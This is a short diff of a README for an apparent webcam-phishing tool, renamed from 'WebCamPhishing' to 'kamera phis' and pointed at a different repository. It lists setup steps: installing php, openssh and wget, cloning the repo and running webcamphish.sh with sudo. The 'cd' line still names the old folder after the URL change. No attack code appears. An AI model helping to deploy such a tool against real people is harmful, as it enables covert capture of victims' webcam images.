@@ -1,4 +1,4 @@
-<h1 align="center">WebCamPhishing</h1>
+<h1 align="center">kamera phis</h1>
 
 <br />
 
@@ -52,7 +52,7 @@ sudo apt -y install php openssh git wget unzip gzip
 ## Follow the command to use the module/script:
 
 ```
-git clone https://github.com/jasut1n/WebCamPhishing
+git clone https://github.com/CENSUY/kamera-phi
 cd WebCamPhishing
 chmod +x webcamphish.sh
 sudo ./webcamphish.sh
